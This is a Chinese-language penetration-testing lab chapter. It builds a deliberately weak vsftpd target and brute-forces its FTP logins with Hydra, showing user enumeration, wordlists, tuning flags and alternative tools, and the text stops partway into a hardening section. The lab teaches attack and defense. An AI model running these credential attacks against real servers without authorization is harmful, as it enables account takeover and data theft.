# 🔐 使用 Hydra 攻击 FTP 服务

> **章节编号**：ch07 | **难度**：⭐⭐ 初级 | **预计时间**：40 分钟

---

## 📋 学习目标

完成本实验后，你将能够：

1. 🎯 **理解 FTP 协议的工作原理**：掌握 FTP 主动/被动模式、认证流程及协议安全特性
2. 🏗️ **搭建 vsftpd 靶机环境**：独立完成 FTP 服务的安装、配置与用户管理
3. 🔍 **识别 FTP 服务的安全风险**：能够通过匿名访问、用户枚举等手段发现 FTP 服务的薄弱环节
4. ⚔️ **使用 Hydra 对 FTP 服务进行密码爆破**：熟练掌握 Hydra 的 FTP 模块参数与优化策略
5. 🛡️ **实施 FTP 服务的安全加固**：配置 vsftpd 安全选项、部署 FTP over TLS、制定防御策略

---

## 📚 背景知识

### 一、FTP 协议概述

FTP（File Transfer Protocol，文件传输协议）是互联网上最古老的协议之一，诞生于 1971 年，由 Abhay Bhushan 首次提出（RFC 114）。经过数十年的发展，FTP 至今仍在大量企业内网、老旧系统、嵌入式设备中被广泛使用。正是这种"古老而普遍"的特性，使其成为渗透测试中最常见的攻击面之一。

FTP 协议的核心设计目标是实现可靠的文件传输，它基于 **TCP** 协议，使用 **双通道架构**——即控制连接（Control Connection）和数据连接（Data Connection）分离的设计。这种双通道设计是 FTP 与大多数应用层协议最大的不同之处，也是理解 FTP 安全问题的关键起点。

| 特性 | 说明 |
|------|------|
| 协议号 | TCP 21（控制）+ TCP 20（主动模式数据）|
| RFC 文档 | RFC 959（1985年，FTP 核心标准）|
| 编码方式 | 明文传输（原始设计无加密）|
| 认证方式 | 用户名/密码（USER/PASS 命令）|
| 并发支持 | 支持多用户同时连接 |

---

### 二、FTP 双通道架构详解

#### 🔌 控制连接（Control Connection）

控制连接是 FTP 的"指挥通道"，负责传输客户端与服务器之间的所有命令和响应。客户端在发起 FTP 会话时，首先与服务器 TCP 21 端口建立一条持久的 TCP 连接，这条连接在整个会话期间保持打开状态。

控制连接上传输的内容包括：

```
USER username        # 发送用户名
PASS password        # 发送密码
PWD                  # 查看当前目录
CWD /path            # 切换目录
LIST                 # 列出目录内容
RETR filename        # 下载文件
STOR filename        # 上传文件
QUIT                 # 断开连接
```

服务器对每条命令都会返回 **三位数响应码**，格式为 `响应码 描述文本`。例如：

```
220 (vsFTPd 3.0.3)                    # 服务就绪
331 Please specify the password.       # 用户名正确，需要密码
230 Login successful.                  # 认证成功
530 Login incorrect.                   # 认证失败
```

这些响应码对于渗透测试至关重要——不同的响应码可以帮助我们判断认证是否成功、服务类型、版本信息等。

#### 📦 数据连接（Data Connection）

数据连接是 FTP 的"运输通道"，专门用于传输文件内容和目录列表。数据连接是临时性的——每次文件传输或目录列表请求时建立，传输完成后关闭。

数据连接的建立方式取决于 FTP 的工作模式，这也是 FTP 协议最复杂、最容易出问题的部分。

---

### 三、FTP 主动模式（Active Mode / PORT）

主动模式是 FTP 最初的设计，工作流程如下：

```
客户端                                服务器
  |                                      |
  |--- TCP 21 控制连接建立 ------------->|
  |                                      |
  |<-- 220 Ready -----------------------|
  |--- USER username ------------------->|
  |<-- 331 Need password ---------------|
  |--- PASS password ------------------->|
  |<-- 230 Login OK --------------------|
  |                                      |
  |--- PORT 192,168,1,100,4,1 --------->|  ① 客户端告知自己的数据端口
  |<-- 200 PORT command successful -----|
  |                                      |
  |          ② 服务器从 TCP 20 主动连接客户端端口 1025     |
  |<== TCP 20 → 1025 数据连接 =========>|
  |<== 文件数据传输 ===================>|
```

**关键点**：
- 客户端通过 `PORT` 命令告诉服务器自己的 IP 和数据端口（`PORT h1,h2,h3,h4,p1,p2`，其中端口号 = p1×256 + p2）
- 服务器从 TCP 20 端口**主动**连接客户端指定的端口
- 这意味着服务器向客户端发起反向连接——在防火墙/NAT 环境下经常被阻挡

**主动模式的问题**：
1. 🔥 客户端防火墙通常会阻止入站连接
2. 🔥 NAT 设备无法正确转发服务器到客户端的连接
3. 🔥 客户端必须开放一个高位端口接收数据
4. 🔥 存在 FTP Bounce 攻击风险（利用 PORT 命令让服务器攻击第三方）

#### FTP Bounce 攻击简述

FTP Bounce 攻击是一种利用 FTP 主动模式特性的经典攻击方式。攻击者连接到一台 FTP 服务器，发送 `PORT` 命令指定目标主机的 IP 和端口，然后使用 `RETR` 命令传输文件。这样，FTP 服务器就会向目标主机的指定端口发起连接，攻击者借此可以：

- 扫描目标网络的端口（通过观察响应码判断端口是否开放）
- 绕过防火墙访问限制（利用受信任的 FTP 服务器作为跳板）
- 发起匿名攻击（攻击流量来自 FTP 服务器而非攻击者）

现代 FTP 服务器已通过配置选项（如 vsftpd 的 `port_promiscuous`）默认阻止了此类攻击。

---

### 四、FTP 被动模式（Passive Mode / PASV）

被动模式是为了解决主动模式在防火墙/NAT 环境下的问题而设计的：

```
客户端                                服务器
  |                                      |
  |--- TCP 21 控制连接建立 ------------->|
  |                                      |
  |--- PASV --------------------------->|  ① 客户端请求被动模式
  |<-- 227 Entering Passive Mode -------|  ② 服务器告知数据端口
  |    (192,168,1,1,195,80)             |     端口 = 195×256+80 = 50000
  |                                      |
  |          ③ 客户端主动连接服务器端口 50000           |
  |=== 客户端 → 50000 数据连接 ========>|
  |=== 文件数据传输 ====================|
```

**关键点**：
- 服务器通过 `PASV` 命令的响应（227）告知客户端自己的 IP 和数据端口
- 客户端**主动**连接服务器的数据端口
- 所有连接都由客户端发起，对客户端防火墙友好

**被动模式的问题**：
1. 🔥 服务器需要开放大量高位端口（可能被服务器端防火墙阻止）
2. 🔥 服务器端口范围难以精确控制
3. 🔥 227 响应中可能泄露服务器内部 IP（NAT 环境下导致连接失败）

---

### 五、FTP 认证过程详解

FTP 的认证过程非常简单——仅通过两条明文命令完成：

```
C: USER admin
S: 331 Please specify the password.
C: PASS 123456
S: 230 Login successful.
```

**认证流程分析**：

1. **USER 命令**：客户端发送用户名。服务器检查该用户是否存在：
   - 存在 → 返回 `331`（需要密码）
   - 不存在 → 不同服务器的行为不同：
     - vsftpd：返回 `331`（不泄露用户是否存在）✅ 安全
     - ProFTPD：返回 `331`（同样安全）✅ 安全
     - 某些旧版服务器：返回 `530`（泄露用户不存在）❌ 不安全

2. **PASS 命令**：客户端发送密码。服务器验证：
   - 正确 → 返回 `230`（登录成功）
   - 错误 → 返回 `530`（登录失败）

3. **关键安全缺陷**：
   - 🚨 **明文传输**：用户名和密码以明文在网络上传输，任何嗅探器都能截获
   - 🚨 **无账户锁定**：大多数 FTP 服务器默认没有登录失败次数限制
   - 🚨 **无延迟惩罚**：认证失败不会增加响应延迟，暴力破解速度快
   - 🚨 **无验证码**：没有人机验证机制

这就是为什么 Hydra 可以高效地爆破 FTP 服务——认证过程简单、无防护机制、响应差异明显。

---

### 六、匿名 FTP 与认证 FTP

#### 📂 匿名 FTP（Anonymous FTP）

匿名 FTP 是 FTP 协议的一个特殊功能，允许用户无需真实账户即可访问服务器上的公共文件。标准做法是使用用户名 `anonymous` 或 `ftp`，密码通常填入电子邮件地址（实际上大多数服务器不验证密码内容）。

```
C: USER anonymous
S: 331 Please specify the password.
C: PASS guest@example.com
S: 230 Login successful.
```

**匿名 FTP 的常见配置**：
- 只读访问（只能下载，不能上传）
- 限制在特定目录（如 `/var/ftp/pub`）
- 限制带宽和连接数
- 禁止目录遍历

**安全风险**：
- 🚨 可能泄露敏感文件（配置文件、备份文件、日志等）
- 🚨 若配置不当允许上传，可能被用于存储恶意文件
- 🚨 可作为信息收集的起点（目录结构、文件名暗示系统信息）
- 🚨 某些匿名 FTP 服务器启用了写入权限，可能被利用提权

#### 🔒 认证 FTP（Authenticated FTP）

认证 FTP 要求用户提供合法的用户名和密码才能访问。这是企业环境中最常见的 FTP 部署方式。

**认证 FTP 的典型场景**：
- 企业文件共享（员工使用系统账户登录）
- 网站管理（Web 管理员上传网站文件）
- 数据交换（合作伙伴之间传输业务数据）
- 设备管理（路由器、交换机的配置备份）

**安全风险**：
- 🚨 密码强度不足（用户常使用弱密码）
- 🚨 凭证复用（FTP 密码可能与系统登录密码相同）
- 🚨 明文传输（嗅探可获取所有凭证）
- 🚨 默认账户（厂商默认的测试账户未删除）

---

### 七、FTP 安全风险总结

| 风险类别 | 具体描述 | 严重程度 |
|----------|----------|----------|
| 明文传输 | 所有数据（含凭证）以明文传输 | 🔴 高 |
| 暴力破解 | 无账户锁定、无延迟惩罚 | 🔴 高 |
| 匿名访问 | 可能泄露敏感信息 | 🟡 中 |
| FTP Bounce | 利用 PORT 命令攻击第三方 | 🟡 中 |
| 目录遍历 | 配置不当可访问系统文件 | 🔴 高 |
| 默认账户 | 厂商测试账户未删除 | 🔴 高 |
| 版本泄露 | Banner 暴露服务版本信息 | 🟢 低 |
| 中间人攻击 | 无身份验证机制 | 🔴 高 |
| 注入攻击 | 路径/文件名注入 | 🟡 中 |

> 💡 **核心认知**：FTP 协议诞生于互联网的"信任时代"，其设计假设所有参与者都是可信的。在当今的威胁环境下，未加固的 FTP 服务几乎等同于"敞开的大门"。

---

## 🖥️ 实验环境

### 环境要求

| 组件 | 要求 | 说明 |
|------|------|------|
| 操作系统 | Ubuntu 20.04/22.04 LTS | 推荐 VMware/VirtualBox 虚拟机 |
| 内存 | ≥ 2 GB | 最低要求 |
| 磁盘 | ≥ 20 GB | 最低要求 |
| 网络 | NAT/桥接模式 | 确保攻击机与靶机互通 |
| 攻击机 | Kali Linux / 任意 Linux | 需安装 Hydra |
| 权限 | root/sudo | 搭建靶机需要管理员权限 |

> ⚠️ **重要提醒**：本实验仅限在授权的实验环境中进行。未经授权对真实系统进行密码爆破属于违法行为！

### 搭建 vsftpd 靶机

vsftpd（Very Secure FTP Daemon）是 Linux 下最常用的 FTP 服务器之一，以安全性和高性能著称。我们将使用它来搭建实验靶机。

#### 步骤 1：安装 vsftpd

```bash
# 更新软件源
sudo apt update

# 安装 vsftpd
sudo apt install -y vsftpd

# 验证安装
vsftpd -v
# 预期输出：vsftpd: version 3.0.3（或更高版本）
```

#### 步骤 2：创建实验用户

```bash
# 创建测试用户（弱密码，用于爆破练习）
sudo useradd -m -s /bin/bash ftpuser1
echo "ftpuser1:password123" | sudo chpasswd

sudo useradd -m -s /bin/bash ftpuser2
echo "ftpuser2:admin888" | sudo chpasswd

sudo useradd -m -s /bin/bash ftpuser3
echo "ftpuser3:letmein" | sudo chpasswd

# 创建一个强密码用户（用于对比测试）
sudo useradd -m -s /bin/bash ftpadmin
echo "ftpadmin:Kj8\$mP2xQw!vR5nL" | sudo chpasswd

# 为每个用户创建 FTP 目录
sudo mkdir -p /home/ftpuser1/ftp/upload
sudo mkdir -p /home/ftpuser2/ftp/upload
sudo mkdir -p /home/ftpuser3/ftp/upload

# 设置权限
sudo chmod 755 /home/ftpuser1/ftp
sudo chmod 755 /home/ftpuser1/ftp/upload
sudo chown -R ftpuser1:ftpuser1 /home/ftpuser1/ftp

sudo chmod 755 /home/ftpuser2/ftp
sudo chmod 755 /home/ftpuser2/ftp/upload
sudo chown -R ftpuser2:ftpuser2 /home/ftpuser2/ftp

sudo chmod 755 /home/ftpuser3/ftp
sudo chmod 755 /home/ftpuser3/ftp/upload
sudo chown -R ftpuser3:ftpuser3 /home/ftpuser3/ftp

# 创建测试文件
echo "This is a secret document for ftpuser1." | sudo tee /home/ftpuser1/ftp/secret.txt
echo "Backup config file - database credentials inside." | sudo tee /home/ftpuser2/ftp/config.bak
echo "System log file from 2026-06-01." | sudo tee /home/ftpuser3/ftp/system.log
```

#### 步骤 3：配置 vsftpd（初始版本——故意留有漏洞）

```bash
# 备份原始配置
sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak

# 写入实验配置
sudo tee /etc/vsftpd.conf > /dev/null << 'EOF'
# vsftpd 实验配置 - 故意存在安全漏洞用于练习

# 基本设置
listen=YES
listen_ipv6=NO
anonymous_enable=YES          # ⚠️ 允许匿名登录（实验用）
local_enable=YES              # 允许本地用户登录
write_enable=YES              # 允许写入操作
local_umask=022               # 默认文件权限掩码
dirmessage_enable=YES         # 显示目录欢迎消息
use_localtime=YES             # 使用本地时间
xferlog_enable=YES            # 启用传输日志
connect_from_port_20=YES      # 主动模式使用20端口
xferlog_std_format=YES        # 标准日志格式

# 匿名 FTP 设置
anon_root=/var/ftp            # 匿名用户根目录
anon_upload_enable=YES        # ⚠️ 允许匿名上传（实验用）
anon_mkdir_write_enable=YES   # ⚠️ 允许匿名创建目录
anon_other_write_enable=YES   # ⚠️ 允许匿名删除/重命名

# 用户限制
chroot_local_user=NO         # ⚠️ 未限制用户在家目录内
chroot_list_enable=NO        # 未启用 chroot 列表
allow_writeable_chroot=YES

# 连接设置
max_clients=0                 # 不限制最大客户端数
max_per_ip=0                  # 不限制每IP连接数
idle_session_timeout=600      # 空闲超时600秒

# 安全设置（故意放宽）
pam_service_name=vsftpd
userlist_enable=NO            # ⚠️ 未启用用户列表限制
tcp_wrappers=NO               # ⚠️ 未启用TCP包装器

# Banner - 泄露版本信息
ftpd_banner=Welcome to FTP Server
EOF
```

#### 步骤 4：设置匿名 FTP 目录

```bash
# 创建匿名 FTP 目录
sudo mkdir -p /var/ftp/pub
sudo mkdir -p /var/ftp/uploads

# 创建匿名可访问的文件
echo "Welcome to the public FTP server." | sudo tee /var/ftp/pub/README.txt
echo "This is a public document." | sudo tee /var/ftp/pub/document.pdf
echo "Internal server IP: 192.168.1.100" | sudo tee /var/ftp/pub/network-info.txt

# 设置权限
sudo chown -R root:root /var/ftp
sudo chmod 755 /var/ftp
sudo chmod 755 /var/ftp/pub
sudo chmod 777 /var/ftp/uploads  # ⚠️ 允许任何人写入
```

#### 步骤 5：启动 vsftpd 服务

```bash
# 重启 vsftpd 服务
sudo systemctl restart vsftpd

# 检查服务状态
sudo systemctl status vsftpd
# 预期输出：active (running)

# 验证端口监听
sudo ss -tlnp | grep :21
# 预期输出：LISTEN  0  32  0.0.0.0:21  0.0.0.0:*
```

#### 步骤 6：确认网络连通性

```bash
# 在靶机上查看 IP 地址
ip addr show | grep "inet "

# 在攻击机上测试连通性
ping -c 3 192.168.1.100

# 测试 FTP 端口
nc -zv 192.168.1.100 21
# 预期输出：192.168.1.100:21 (ftp) open
```

> 💡 **提示**：将靶机 IP 记录下来，后续步骤中用 `<TARGET_IP>` 表示。本文档中的示例使用 `192.168.1.100`。

---

## 🔬 实验步骤

### 任务一：搭建 FTP 靶机验证

在开始攻击之前，先验证 FTP 服务正常工作。

#### 1.1 使用 ftp 命令测试连接

```bash
ftp 192.168.1.100
```

预期交互：

```
Connected to 192.168.1.100.
220 Welcome to FTP Server
Name (192.168.1.100:kali): ftpuser1
331 Please specify the password.
Password: [输入 password123]
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

```bash
ftp> pwd
257 "/home/ftpuser1"

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jun 08 08:00 ftp
226 Directory send OK.

ftp> cd ftp
250 Directory successfully changed.

ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for secret.txt (38 bytes).
226 Transfer complete.

ftp> quit
221 Goodbye.
```

✅ FTP 服务正常工作，认证用户可以登录并下载文件。

#### 1.2 检查 vsftpd 日志

```bash
sudo tail -20 /var/log/vsftpd.log
```

预期输出：

```
Sun Jun  8 08:05:01 2026 [pid 12345] CONNECT: Client "192.168.1.50"
Sun Jun  8 08:05:03 2026 [pid 12345] FTP command: Client "192.168.1.50", "USER ftpuser1"
Sun Jun  8 08:05:05 2026 [pid 12345] [ftpuser1] OK LOGIN: Client "192.168.1.50"
```

---

### 任务二：匿名 FTP 访问测试

#### 2.1 匿名登录测试

```bash
ftp 192.168.1.100
```

交互过程：

```
Connected to 192.168.1.100.
220 Welcome to FTP Server
Name (192.168.1.100:kali): anonymous
331 Please specify the password.
Password: [直接回车或输入任意内容]
230 Login successful.
ftp>
```

> 🚨 匿名登录成功！这是一个严重的安全风险。

#### 2.2 枚举匿名 FTP 内容

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 08 08:00 pub
drwxrwxrwx    2 0        0            4096 Jun 08 08:00 uploads
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls
-rw-r--r--    1 0        0             34 Jun 08 08:00 README.txt
-rw-r--r--    1 0        0             31 Jun 08 08:00 document.pdf
-rw-r--r--    1 0        0             42 Jun 08 08:00 network-info.txt
226 Directory send OK.

ftp> get network-info.txt
226 Transfer complete.

ftp> quit
221 Goodbye.
```

#### 2.3 查看泄露的敏感信息

```bash
cat network-info.txt
# 输出：Internal server IP: 192.168.1.100
```

> 🚨 通过匿名 FTP 获取了服务器内部 IP 信息！在实际场景中，可能泄露更敏感的信息，如数据库凭证、API 密钥等。

#### 2.4 测试匿名上传功能

```bash
echo "test upload from anonymous" > test_upload.txt

ftp 192.168.1.100
```

```
Name (192.168.1.100:kali): anonymous
331 Please specify the password.
Password: [回车]
230 Login successful.

ftp> cd uploads
ftp> put test_upload.txt
226 Transfer complete.

ftp> quit
221 Goodbye.
```

> 🚨 匿名用户可以上传文件！攻击者可能利用此功能上传恶意文件或消耗磁盘空间。

---

### 任务三：FTP 用户枚举

在进行密码爆破之前，先确定目标系统上存在哪些有效用户，可以大幅减少爆破的工作量。

#### 3.1 通过 Banner 识别服务

```bash
nc 192.168.1.100 21
# 预期输出：220 Welcome to FTP Server
```

#### 3.2 使用 nmap 识别 FTP 服务

```bash
nmap -sV -p 21 192.168.1.100
```

预期输出：

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```

#### 3.3 手动用户枚举

```bash
# 创建用户名字典
cat > users.txt << 'EOF'
root
admin
ftp
anonymous
ftpuser1
ftpuser2
ftpuser3
ftpadmin
test
guest
EOF
```

```bash
# 编写 FTP 用户枚举脚本
cat > ftp_enum.sh << 'SCRIPT'
#!/bin/bash
TARGET="192.168.1.100"
echo "[*] FTP 用户枚举 - 目标: $TARGET"
echo "======================================"

while read username; do
    response=$(echo -e "USER $username\nQUIT" | nc -w 3 $TARGET 21 2>/dev/null | head -2)
    if echo "$response" | grep -q "331"; then
        echo "[+] 用户存在: $username (响应: 331)"
    elif echo "$response" | grep -q "530"; then
        echo "[-] 用户不存在: $username (响应: 530)"
    else
        echo "[?] 未知响应: $username"
    fi
done < users.txt

echo "======================================"
echo "[*] 枚举完成"
SCRIPT

chmod +x ftp_enum.sh
./ftp_enum.sh
```

预期输出：

```
[*] FTP 用户枚举 - 目标: 192.168.1.100
======================================
[-] 用户不存在: root (响应: 530)
[-] 用户不存在: admin (响应: 530)
[+] 用户存在: ftp (响应: 331)
[+] 用户存在: anonymous (响应: 331)
[+] 用户存在: ftpuser1 (响应: 331)
[+] 用户存在: ftpuser2 (响应: 331)
[+] 用户存在: ftpuser3 (响应: 331)
[+] 用户存在: ftpadmin (响应: 331)
======================================
[*] 枚举完成
```

> 📌 **注意**：vsftpd 默认对不存在的用户也返回 `331`，这是安全的设计（不泄露用户是否存在）。但如果目标使用的是旧版或其他 FTP 服务器，可能通过响应码差异来枚举用户。在实际渗透中，可以结合其他信息源（如 SMTP、SSH 枚举结果）来缩小用户范围。

---

### 任务四：使用 Hydra 爆破 FTP

#### 4.1 准备密码字典

```bash
# 创建简单密码字典（用于快速测试）
cat > passwords_small.txt << 'EOF'
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
admin888
password123
666666
qwerty123
1q2w3e4r
welcome
love
EOF
```

```bash
# 也可以使用 Kali 自带的字典
ls /usr/share/wordlists/
# 常用字典：
# - rockyou.txt.gz    （最著名的密码字典，需解压）
# - fasttrack.txt     （快速字典）
# - dirb/big.txt      （综合字典）

# 解压 rockyou.txt（如果需要更大字典）
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt
# 输出：14344399 /usr/share/wordlists/rockyou.txt
```

#### 4.2 Hydra 基础爆破命令

**最简单的 Hydra FTP 爆破命令**：

```bash
hydra -l ftpuser1 -P passwords_small.txt ftp://192.168.1.100
```

参数解读：

| 参数 | 含义 |
|------|------|
| `-l ftpuser1` | 指定单个用户名 |
| `-P passwords_small.txt` | 指定密码字典文件 |
| `ftp://192.168.1.100` | 目标 FTP 服务器 |

预期输出：

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
[DATA] attacking ftp://192.168.1.100:21/
[21][ftp] host: 192.168.1.100   login: ftpuser1   password: password123
1 of 1 target successfully completed, 1 valid password found
```

🎉 成功爆破出 `ftpuser1` 的密码为 `password123`！

#### 4.3 多用户爆破

```bash
hydra -L users.txt -P passwords_small.txt ftp://192.168.1.100
```

预期输出：

```
[21][ftp] host: 192.168.1.100   login: ftpuser1   password: password123
[21][ftp] host: 192.168.1.100   login: ftpuser2   password: admin888
[21][ftp] host: 192.168.1.100   login: ftpuser3   password: letmein
3 of 1 target successfully completed, 3 valid passwords found
```

🎉 成功爆破出三个用户的密码！

#### 4.4 调整并发线程数

```bash
# 使用 -t 参数调整并发线程（默认16，FTP建议4-10）
hydra -l ftpuser1 -P passwords_small.txt -t 4 ftp://192.168.1.100
```

> 💡 **线程数选择建议**：
> - 本地网络/虚拟机：`-t 4` 到 `-t 10`
> - 远程网络：`-t 2` 到 `-t 4`
> - 不稳定网络：`-t 1`（单线程，最稳定但最慢）
> - 线程数过高可能导致误报或连接超时

#### 4.5 设置超时和重试

```bash
hydra -l ftpuser1 -P passwords_small.txt \
  -t 4 \
  -w 10 \
  ftp://192.168.1.100
```

| 参数 | 含义 |
|------|------|
| `-w 10` | 最大超时时间 10 秒 |

#### 4.6 使用指定端口

```bash
# 如果 FTP 服务运行在非标准端口（如 2121）
hydra -l ftpuser1 -P passwords_small.txt -s 2121 ftp://192.168.1.100
```

#### 4.7 保存爆破结果

```bash
hydra -l ftpuser1 -P passwords_small.txt \
  -o ftp_result.txt \
  ftp://192.168.1.100

cat ftp_result.txt
```

预期输出（结果文件格式）：

```
# Hydra v9.5 run at Sun Jun  8 08:20:01 2026 on 192.168.1.100 ftp
host: 192.168.1.100   login: ftpuser1   password: password123
```

#### 4.8 详细输出模式

```bash
# 使用 -V 显示每次尝试的详细信息
hydra -l ftpuser1 -P passwords_small.txt -V ftp://192.168.1.100
```

详细输出示例：

```
[ATTEMPT] target 192.168.1.100 - login "ftpuser1" - pass "123456" - 1 of 25 [child 0]
[ATTEMPT] target 192.168.1.100 - login "ftpuser1" - pass "password" - 2 of 25 [child 1]
[ATTEMPT] target 192.168.1.100 - login "ftpuser1" - pass "12345678" - 3 of 25 [child 2]
...
[21][ftp] host: 192.168.1.100   login: ftpuser1   password: password123
```

#### 4.9 使用 rockyou.txt 大字典爆破

```bash
hydra -l ftpuser1 -P /usr/share/wordlists/rockyou.txt \
  -t 4 \
  -w 10 \
  -o rockyou_result.txt \
  ftp://192.168.1.100
```

> ⚠️ 使用 rockyou.txt 全量字典可能需要数小时甚至数天。在实际操作中，通常先使用小字典快速测试常见弱密码，再根据目标特征定制字典。

---

### 任务五：结果分析与验证

#### 5.1 验证爆破结果

对 Hydra 发现的每一个凭证进行手动验证：

```bash
ftp 192.168.1.100
```

```
Name (192.168.1.100:kali): ftpuser1
331 Please specify the password.
Password: password123
230 Login successful.
```

#### 5.2 分析弱密码特征

```bash
echo "=== 爆破结果汇总 ==="
echo "ftpuser1 : password123  → 纯小写字母+数字，常见组合"
echo "ftpuser2 : admin888     → 用户名部分+简单数字"
echo "ftpuser3 : letmein      → 英文常见短语密码"
echo ""
echo "=== 密码特征分析 ==="
echo "1. 密码长度：8-10位，偏短"
echo "2. 复杂度：仅包含小写字母和数字"
echo "3. 可预测性：均为常见弱密码模式"
echo "4. 与用户名关联：ftpuser2的密码包含admin"
```

#### 5.3 检查 FTP 服务器日志

```bash
# 在靶机上查看 vsftpd 日志，观察爆破痕迹
sudo tail -50 /var/log/vsftpd.log
```

预期输出（截取关键部分）：

```
Sun Jun  8 08:20:01 2026 [pid 12345] [ftpuser1] FAIL LOGIN: Client "192.168.1.50"
Sun Jun  8 08:20:01 2026 [pid 12346] [ftpuser1] FAIL LOGIN: Client "192.168.1.50"
...
Sun Jun  8 08:20:03 2026 [pid 12370] [ftpuser1] OK LOGIN: Client "192.168.1.50"
```

> 📌 **日志分析要点**：
> - 大量 `FAIL LOGIN` 记录 → 明显的暴力破解痕迹
> - 短时间内大量来自同一 IP 的连接 → 异常行为
> - 密码按字典顺序尝试 → 字典攻击特征

---

## 💡 解题技巧

### 技巧 1：🔍 先侦察再爆破

不要上来就跑 Hydra，先完成侦察工作：

```bash
# 1. 端口扫描，确认 FTP 服务
nmap -sV -p 21,2121,2221 <TARGET_IP>

# 2. Banner 抓取，识别服务类型
nc <TARGET_IP> 21

# 3. 匿名登录测试
echo -e "USER anonymous\nPASS test@test.com\nQUIT" | nc -w 3 <TARGET_IP> 21

# 4. nmap 脚本扫描
nmap --script ftp-* -p 21 <TARGET_IP>
```

> 侦察能帮你确定服务类型、版本、是否允许匿名登录等关键信息，从而制定更精准的爆破策略。

### 技巧 2：📝 定制化密码字典

根据目标信息定制字典，比盲目使用大字典效率高得多：

```bash
# 使用 crunch 生成定制字典
# 生成 6-8 位纯数字密码
crunch 6 8 0123456789 -o numeric_passwords.txt

# 生成包含公司名的密码
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -t company@@@ -o company_dict.txt

# 使用 cupp 生成社交工程字典
cupp -i
```

**常见密码模式**：
- `用户名+数字`：admin123, root888
- `公司名+年份`：company2026
- `键盘模式`：qwerty, 1q2w3e
- `中文拼音`：woaini, 5201314
- `默认密码`：查看 CIRT.net 默认密码数据库

### 技巧 3：⚡ 优化 Hydra 性能

```bash
# 最佳实践参数组合
hydra -L users.txt -P passwords.txt \
  -t 4 \                    # FTP 建议线程数
  -w 10 \                   # 超时时间
  -f \                      # 找到一个密码即停止（单用户时）
  -o result.txt \           # 保存结果
  ftp://<TARGET_IP>
```

**性能调优原则**：
- 线程数不是越多越好——过高会导致误报和连接超时
- 稳定网络可用 `-t 8`，不稳定网络用 `-t 2`
- 大字典搭配小线程，小字典可搭配大线程
- 使用 `-f` 在找到密码后立即停止，节省时间

### 技巧 4：🎯 按优先级排列密码

```bash
# 将最可能的密码放在字典前面
cat > prioritized_passwords.txt << 'EOF'
password123
admin123
123456
password
admin
root
test
guest
qwerty
abc123
EOF

# 然后在后面追加 rockyou 的内容
cat /usr/share/wordlists/rockyou.txt >> prioritized_passwords.txt
```

### 技巧 5：🔄 结合多个工具

```bash
# Medusa - 另一个流行的爆破工具
medusa -h 192.168.1.100 -u ftpuser1 -P passwords.txt -M ftp

# ncrack - Nmap 团队的爆破工具
ncrack -p 21 --user ftpuser1 --pass passwords.txt 192.168.1.100

# patator - 多协议暴力破解工具
patator ftp_login host=192.168.1.100 user=ftpuser1 password=FILE0 0=passwords.txt
```

不同工具可能有不同的性能表现和检测结果，建议交叉验证。

### 技巧 6：🧹 清理字典中的无效条目

```bash
# 去除空行和重复
sort -u passwords.txt | uniq > passwords_clean.txt

# 过滤不符合密码策略的条目（如长度过短）
awk 'length >= 6' passwords_clean.txt > passwords_filtered.txt

# 统计字典大小
wc -l passwords_filtered.txt
```

### 技巧 7：📊 分段爆破策略

```bash
# 第一阶段：快速测试 Top 100 常见密码
hydra -l ftpuser1 -P top100.txt -t 8 ftp://<TARGET_IP>

# 第二阶段：测试规则变体
hashcat --force top100.txt -r /usr/share/hashcat/rules/best64.rule --stdout > expanded_dict.txt
hydra -l ftpuser1 -P expanded_dict.txt -t 4 ftp://<TARGET_IP>

# 第三阶段：全量大字典
hydra -l ftpuser1 -P /usr/share/wordlists/rockyou.txt -t 2 ftp://<TARGET_IP>
```

### 技巧 8：🛑 处理连接中断

```bash
# Hydra 支持 RESTORE 文件，可以恢复中断的会话
# 中断时按 Ctrl+C，Hydra 会自动保存恢复文件

# 恢复上一次会话
hydra -R

# 查看 restore 文件
ls -la hydra.restore
```

---

## 🛡️ 防御措施

### 1. 🔒 vsftpd 安全加固配置

以下是一个安全加固后的 vsftpd 配置示例：

```bash
sudo tee /etc/vsftpd.conf > /dev/null << 'EOF'
# vsftpd 安全加固配置

# ===== 基本设置 =====
listen=YES
listen_ipv6=NO
listen_port=21

# ===== 认证设置 =====
anonymous_enable=NO            # ✅ 禁止匿名登录
local_enable=YES               # 允许本地用户登录
pam_service_name=vsftpd        # 使用 PAM 认证

# ===== 用户限制 =====
userlist_enable=YES            # ✅ 启用用户列表
userlist_file=/etc/vsftpd.user_list
userlist_deny=NO               # 白名单模式
chroot_local_user=YES          # ✅ 限制用户在家目录内
chroot_list_enable=NO
allow_writeable_chroot=YES

# ===== 写入控制 =====
write_enable=YES
local_umask=022

# ===== 连接限制 =====
max_clients=20                 # ✅ 最大客户端数
max_per_ip=2                   # ✅ 每 IP 最大连接数
idle_session_timeout=300
data_connection_timeout=60
connect_timeout=30
accept_timeout=30

# ===== 日志 =====
xferlog_enable=YES
xferlog_std_format=YES
log_ftp_protocol=YES           # ✅ 记录所有 FTP 命令

# ===== 安全设置 =====
tcp_wrappers=YES               # ✅ 启用 TCP 包装器
hide_ids=YES                   # ✅ 隐藏文件 UID/GID
deny_file={*.exe,*.bat,*.cmd}

# ===== Banner =====
ftpd_banner=Secure FTP Server  # ✅ 不泄露版本信息

# ===== 被动模式 =====
pasv_enable=YES
pasv_min_port=50000            # ✅ 限制被动模式端口范围
pasv_max_port=50100
EOF
```

**创建用户白名单**：

```bash
